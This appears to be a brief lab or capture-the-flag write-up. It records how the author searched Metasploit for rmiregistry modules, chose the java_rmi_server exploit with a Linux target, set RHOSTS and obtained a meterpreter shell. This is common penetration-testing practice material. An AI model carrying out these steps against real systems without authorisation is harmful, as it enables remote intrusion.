first i searched the metasploit
**msfconsole**
then **search rmiregistry**
Matching Modules
================
   #  Name                                        Disclosure Date  Rank       Check  Description
  -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/misc/java_rmi_server          2011-10-15       excellent  Yes    Java RMI Server Insecure Default Configuration Java Code Execution
   1    \_ target: Generic (Java Payload)         .                .          .      .
   2    \_ target: Windows x86 (Native Payload)   .                .          .      .
   3    \_ target: Linux x86 (Native Payload)     .                .          .      .
   4    \_ target: Mac OS X PPC (Native Payload)  .                .          .      .
   5    \_ target: Mac OS X x86 (Native Payload)  .                .          .      .

i got this so i selected **3rd** where 0 is the exploit and 3rd is the action or say the os
then set RHOSTS and then exploit
i got the meterpreter shell
![[Pasted image 20241224171354.png]]
